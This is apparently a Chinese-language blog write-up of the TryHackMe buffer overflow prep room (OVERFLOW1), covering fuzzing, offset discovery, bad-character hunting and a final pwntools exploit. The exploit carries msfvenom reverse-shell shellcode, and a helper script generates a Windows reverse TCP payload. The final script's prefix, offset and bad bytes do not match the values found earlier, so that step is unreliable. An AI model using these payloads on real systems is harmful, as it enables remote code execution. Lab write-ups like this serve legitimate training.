---
title: Buffer Overflow Prep OVERFLOW1
date: 2021-08-27T23:39:00+08:00
draft: false
url: "/2021/08/27/buffer-overflow-prep-overflow1/"
categories:
  - 資訊安全
  - Windows
showToc: true
TocOpen: false
---

[https://tryhackme.com/room/bufferoverflowprep](https://tryhackme.com/room/bufferoverflowprep)

- Immunity debugger 快捷鍵Ctrl + F2 重開
- F9 開始

## 觀察

- nc 上去，決定這次的目標是 `OVERFLOW1`![](/uploads/2022/02/3a9af-qnTQ0Rn.png)

## Fuzz

- 準備 `Overflow1.spk`

```
s_readline();
s_string("OVERFLOW1 ");
s_string_variable("0");
```

- 執行 `generic_send_tcp 192.168.1.102 1337 Overflow1.spk 0 0`
- Run 下去他就爛ㄌ![](/uploads/2022/02/8dfcb-89HNTl2.png)
- 可以觀察到 EIP 變成 41414141
- ![](/uploads/2022/02/f1adf-xpGvUrG.png)

## Cyclic 找 Offset

```python
from pwn import *
r = remote("192.168.1.102",1337)

perfix = b"OVERFLOW1 "
cy = cyclic()

payload = perfix + cy

r.sendline(payload)
```

- 這題因為長度OK所以可以這樣做正常解法建議先 `b'a'*1000`
- 先 try 到 offset 蓋到 EIP 變成 `0x616161`1000 , 5000 之類的亂猜
- 因為有時候蓋太多他也會爛到 EIP 不變 QQ之後 `cyclic(長度)`，就可以產出指定的長度觀察 EIP 變成 `61757461`- ![](/uploads/2022/02/674f1-1BTGO9u.png)`pwn cyclic -l 0x61757461`- ![](/uploads/2022/02/ddac4-hjLOr0q.png)
- Offset 為 1978重新測試

```python
from pwn import *
r = remote("192.168.1.102",1337)

perfix = b"OVERFLOW1 "
padding = b'a' * 1978

payload = perfix + padding + b'bbbb'

r.sendline(payload)
```

![](/uploads/2022/02/b4dc8-JrLxWEq.png)

發現 EIP 順利蓋成了 "bbbb" (62626262)

## 紀錄繼續蓋的資料

- 先繼續蓋一波，觀察資料會蓋去哪

```python
from pwn import *
r = remote("192.168.1.102",1337)

perfix = b"OVERFLOW1 "
padding = b'a' * 1978
return_address = b'bbbb'
payload = perfix + padding + return_address + cyclic()

r.sendline(payload)
```

- 發現會直接蓋到 ESP![](/uploads/2022/02/9b9af-offxAM5.png)

## 尋找 Return Address

- 輸入 `!mona jmp -r esp`![](/uploads/2022/02/d2143-P4lbInG.png)
- 可以找到 `0x625011af`

## 尋找 Badword

(使用到的腳本在最下面)

- 測試 BadWord

```python
from pwn import *
r = remote("192.168.1.102",1337)

perfix = b"OVERFLOW1 "
padding = b'a' * 1978
return_address = b'bbbb'
badword = bytes([i for i in range(1,0xff+1)])
payload = perfix + padding + return_address + badword

r.sendline(payload)
```

- 對 ESP 選 Follow in dump![](/uploads/2022/02/3cf06-DV7CICB.png)複製出來存到 dump.txt- ![](/uploads/2022/02/3417c-V7wIQew.png)執行神奇小腳本- ![](/uploads/2022/02/3614f-QfusPuZ.png)
- 因為 Badword 有可能會影響到下一個 Bytes，所以圈出來的部分需要重新測試

```python
from pwn import *
r = remote("192.168.1.102",1337)

perfix = b"OVERFLOW1 "
padding = b'a' * 1978
return_address = b'bbbb'
badword = b"\x01\x07\x01\x08\x01\x2E\x01\x2F\x01\xA0\x01\xA1"
payload = perfix + padding + return_address + badword

r.sendline(payload)
```

- 取得新的資料貼到 `dump2.txt`輸入 `\x00\x07\x2e\xa0`
- ![](/uploads/2022/02/6faa3-hjhBOMg.png)取得 Badword 為 `\x00\x07\x2e\xa0`並自動產出 Exploit- ![](/uploads/2022/02/27207-0Dn4Bfu.png)

## 套用 Exploit

```python
from pwn import *
import string
r = remote("192.168.1.102",1337)

perfix = b"OVERFLOW2 "
# c = cyclic(700)
overflow = b'A' * 634 
new_eip = p32(0x625011af)
# badword = bytes([i for i in range(1,0xff+1)])
# badword = b"\x01\x23\x01\x24\x01\x3C\x01\x3D\x01\x83\x01\x84\x01\xBA\x01\xBB"

buf =  b""
buf += b"\xfc\xbb\xeb\xda\x50\x3b\xeb\x0c\x5e\x56\x31\x1e\xad"
buf += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x17"
buf += b"\x32\xd2\x3b\xe7\xc3\xb3\xb2\x02\xf2\xf3\xa1\x47\xa5"
buf += b"\xc3\xa2\x05\x4a\xaf\xe7\xbd\xd9\xdd\x2f\xb2\x6a\x6b"
buf += b"\x16\xfd\x6b\xc0\x6a\x9c\xef\x1b\xbf\x7e\xd1\xd3\xb2"
buf += b"\x7f\x16\x09\x3e\x2d\xcf\x45\xed\xc1\x64\x13\x2e\x6a"
buf += b"\x36\xb5\x36\x8f\x8f\xb4\x17\x1e\x9b\xee\xb7\xa1\x48"
buf += b"\x9b\xf1\xb9\x8d\xa6\x48\x32\x65\x5c\x4b\x92\xb7\x9d"
buf += b"\xe0\xdb\x77\x6c\xf8\x1c\xbf\x8f\x8f\x54\xc3\x32\x88"
buf += b"\xa3\xb9\xe8\x1d\x37\x19\x7a\x85\x93\x9b\xaf\x50\x50"
buf += b"\x97\x04\x16\x3e\xb4\x9b\xfb\x35\xc0\x10\xfa\x99\x40"
buf += b"\x62\xd9\x3d\x08\x30\x40\x64\xf4\x97\x7d\x76\x57\x47"
buf += b"\xd8\xfd\x7a\x9c\x51\x5c\x13\x51\x58\x5e\xe3\xfd\xeb"
buf += b"\x2d\xd1\xa2\x47\xb9\x59\x2a\x4e\x3e\x9d\x01\x36\xd0"
buf += b"\x60\xaa\x47\xf9\xa6\xfe\x17\x91\x0f\x7f\xfc\x61\xaf"
buf += b"\xaa\x53\x31\x1f\x05\x14\xe1\xdf\xf5\xfc\xeb\xef\x2a"
buf += b"\x1c\x14\x3a\x43\xb7\xef\xad\xac\xe0\xee\x47\x45\xf3"
buf += b"\xf0\x89\x50\x7a\x16\xdf\x4a\x2b\x81\x48\xf2\x76\x59"
buf += b"\xe8\xfb\xac\x24\x2a\x77\x43\xd9\xe5\x70\x2e\xc9\x92"
buf += b"\x70\x65\xb3\x35\x8e\x53\xdb\xda\x1d\x38\x1b\x94\x3d"
buf += b"\x97\x4c\xf1\xf0\xee\x18\xef\xab\x58\x3e\xf2\x2a\xa2"
buf += b"\xfa\x29\x8f\x2d\x03\xbf\xab\x09\x13\x79\x33\x16\x47"
buf += b"\xd5\x62\xc0\x31\x93\xdc\xa2\xeb\x4d\xb2\x6c\x7b\x0b"
buf += b"\xf8\xae\xfd\x14\xd5\x58\xe1\xa5\x80\x1c\x1e\x09\x45"
buf += b"\xa9\x67\x77\xf5\x56\xb2\x33\x15\xb5\x16\x4e\xbe\x60"
buf += b"\xf3\xf3\xa3\x92\x2e\x37\xda\x10\xda\xc8\x19\x08\xaf"
buf += b"\xcd\x66\x8e\x5c\xbc\xf7\x7b\x62\x13\xf7\xa9\x62\x93"
buf += b"\x07\x52"

shell_code = p32(0x90909090) * 2 + buf
payload = perfix + overflow + new_eip + shell_code
r.sendline(payload)
```

- ![](/uploads/2022/02/bee6d-wxHQnYU.png)成功 !!

## 附錄

### 第一階段尋找 Badwords

`find_badwords1.py`

```python
with open("dump.txt",'r') as f:
    s = f.read()

s = s.split("\n")

new_array = []
for l in s:
    t = l.split("  ")
    new_array += t[1].split(" ")

full_array = [hex(i)[2:].upper().zfill(2) for i in range(1,0xff+1)]
badwords = [r'\x00']

non_badword = []
for i,j in zip(new_array,full_array):
    if i != j:
        badwords.append(r"\x"+j)
        # print(i,j)
    else:
        non_badword.append(r"\x"+j)

print("Probably Badword : ",''.join(badwords).lower())

print("Next Try : b\"" , end='')
for i in badwords[1:]: # null must bad
    print(non_badword[0]+i,end='')
print("\"")
```

### 第二階段尋找 Badwords + 自動 Exploit

`find_badwords1.py`

```python
import os
with open("dump2.txt",'r') as f:
    s = f.read()

s = s.split("\n")

new_array = []
for l in s:
    t = l.split("  ")
    new_array += t[1].split(" ")

new_array = new_array[1::2]
p = list(eval(input("Try payload : ")))
p = p[1::2]
p = [hex(i)[2:].upper().zfill(2) for i in p]

bad_words = [r'\x00']
for i,j in zip(new_array,p):
    if i != j:
        bad_words.append(r"\x"+j)

print("Badword : ",''.join(bad_words).lower())

ip = "192.168.1.106"
port = 7877
os.system(f'msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} EXITFUNC=thread -f python -a x86 -b "{bad_words}"')
```
